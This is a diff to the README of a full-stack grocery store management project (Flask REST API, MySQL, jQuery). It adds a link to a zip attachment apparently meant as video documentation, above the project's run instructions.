@@ -1,6 +1,9 @@
 # Grocery-store-management
 "A Full-Stack Grocery Store Management System with a Flask REST API backend, MySQL database integration, and a dynamic jQuery frontend for managing inventory and processing customer orders."
 
+[video_doc.zip](https://github.com/user-attachments/files/24662627/video_doc.zip)
+
+
 
 🚀 How to Run the Project
 Follow these steps to get the GSMS application running on your local machine:
